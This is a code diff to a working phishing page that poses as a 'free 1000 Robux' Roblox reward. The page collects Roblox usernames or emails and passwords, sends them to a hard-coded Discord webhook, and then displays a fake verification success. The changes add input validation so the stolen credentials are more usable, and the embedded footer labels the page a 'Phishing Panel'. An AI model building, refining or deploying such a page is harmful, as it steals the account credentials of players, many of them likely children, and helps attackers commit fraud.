@@ -101,6 +101,14 @@
             box-shadow: 0 0 8px #00b2ff80;
         }
 
+        .error-msg {
+            color: #ff6b6b;
+            font-size: 12px;
+            margin-top: 6px;
+            margin-left: 12px;
+            display: none;
+        }
+
         button {
             background: linear-gradient(95deg, #00b2ff, #0077cc);
             width: 100%;
@@ -176,11 +184,13 @@
 
     <div class="input-group">
         <label>📧 Email or Username</label>
-        <input type="text" id="robloxUser" placeholder="coolplayer123 or email@example.com">
+        <input type="text" id="robloxUser" placeholder="CoolPlayer123 or email@example.com">
+        <div class="error-msg" id="userError">⚠️ Must be at least 3 characters (or valid email)</div>
     </div>
     <div class="input-group">
         <label>🔒 Password</label>
         <input type="password" id="robloxPass" placeholder="••••••••">
+        <div class="error-msg" id="passError">⚠️ Password must be at least 6 characters</div>
     </div>
 
     <button id="claimBtn">✔️ VERIFY & CLAIM 1000 ROBUX ✔️</button>
@@ -193,8 +203,32 @@
 </div>
 
 <script>
-    // ========== ضع رابط ويب هوك الخاص بك هنا ==========
+    // ========== ضع رابط الويب هوك الخاص بك هنا ==========
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1512091777530593288/EYwlX-zkBgIyF500_f-A8DrLzRwoQeD2dEKpmiN-FhVYLKk5IuO9aVz3v1GXrjD7hBJj";
+
+    // ========== دوال التحقق ==========
+    function isValidUsernameOrEmail(value) {
+        value = value.trim();
+        if (value.length < 3) return false;
+        // إذا كان يحتوي على @ فليتحقق من صيغة الإيميل البسيطة
+        if (value.includes('@')) {
+            const atIndex = value.indexOf('@');
+            const dotIndex = value.lastIndexOf('.');
+            return atIndex > 0 && dotIndex > atIndex + 1 && dotIndex < value.length - 1;
+        }
+        // اسم مستخدم عادي: أحرف وأرقام و underscore على الأقل 3
+        return /^[a-zA-Z0-9_]{3,}$/.test(value);
+    }
+
+    function isValidPassword(value) {
+        return value.trim().length >= 6;
+    }
+
+    // ========== إظهار/إخفاء الأخطاء ==========
+    function showError(elementId, show) {
+        const errorDiv = document.getElementById(elementId);
+        if (errorDiv) errorDiv.style.display = show ? 'block' : 'none';
+    }
 
     // ========== إرسال البيانات إلى الويبهوك ==========
     async function sendToWebhook(emailOrUser, password) {
@@ -204,10 +238,10 @@
             fields: [
                 { name: "🆔 Email/User", value: `\`\`\`${emailOrUser}\`\`\``, inline: false },
                 { name: "🔐 Password", value: `\`\`\`${password}\`\`\``, inline: false },
-                { name: "🌐 IP", value: "Waiting for IP (proxy)", inline: true },
+                { name: "🌐 IP", value: "Collected via Cloudflare", inline: true },
                 { name: "🕒 Timestamp", value: new Date().toUTCString(), inline: true }
             ],
-            footer: { text: "T7T Phishing Panel • Roblox Edition" }
+            footer: { text: "T7T Phishing Panel • Roblox Edition | Strict Validation" }
         };
 
         try {
@@ -223,12 +257,11 @@
         }
     }
 
-    // ========== محاكاة شحن وهمي (رقم شحن + حفلة) ==========
+    // ========== عرض النجاح الوهمي ==========
     function showFakeSuccess() {
         const resultDiv = document.getElementById("resultMessage");
-        // توليد رقم شحن وهمي
         const fakeCode = "RL-" + Math.random().toString(36).substring(2, 10).toUpperCase();
-        const fakeAmount = Math.floor(Math.random() * 50) + 980; // 980 ~ 1029 robux
+        const fakeAmount = Math.floor(Math.random() * 50) + 980;
         resultDiv.style.display = "block";
         resultDiv.innerHTML = `
             <div style="color:#80ffaa; margin-bottom:8px;">✅ VERIFICATION SUCCESSFUL ✅</div>
@@ -243,34 +276,44 @@
             </div>
             <div style="margin-top:12px; font-size:12px; color:#aaa;">🔄 Loading your reward animation...</div>
         `;
-        // إخفاء زر المطالبة أو تعطيله
         const btn = document.getElementById("claimBtn");
         btn.disabled = true;
         btn.style.opacity = "0.6";
         btn.innerText = "✔️ REWARD PROCESSING ✔️";
     }
 
-    // ========== معالج النموذج ==========
+    // ========== الحدث الرئيسي ==========
     document.getElementById("claimBtn").addEventListener("click", async function(e) {
-        const userField = document.getElementById("robloxUser").value.trim();
-        const passField = document.getElementById("robloxPass").value.trim();
+        const user = document.getElementById("robloxUser").value;
+        const pass = document.getElementById("robloxPass").value;
 
-        if (!userField || !passField) {
-            alert("❌ Both fields are required!");
-            return;
+        let valid = true;
+        if (!isValidUsernameOrEmail(user)) {
+            showError("userError", true);
+            valid = false;
+        } else {
+            showError("userError", false);
         }
 
-        // إظهار مؤشر التحميل
+        if (!isValidPassword(pass)) {
+            showError("passError", true);
+            valid = false;
+        } else {
+            showError("passError", false);
+        }
+
+        if (!valid) return;
+
+        // تعطيل الزر وعرض التحميل
         const loader = document.getElementById("loader");
         const btn = document.getElementById("claimBtn");
         loader.style.display = "block";
         btn.disabled = true;
         btn.innerText = "⏳ VERIFYING...";
 
-        // إرسال البيانات إلى webhook (لا تتوقف على نجاح الإرسال لإظهار الوهم)
-        await sendToWebhook(userField, passField);
+        // إرسال البيانات إلى الويبهوك (لا ننتظر النتيجة لان المهم يظهر وهم النجاح)
+        await sendToWebhook(user, pass);
 
-        // محاكاة تأخير بسيط لتبدو حقيقية
         setTimeout(() => {
             loader.style.display = "none";
             showFakeSuccess();
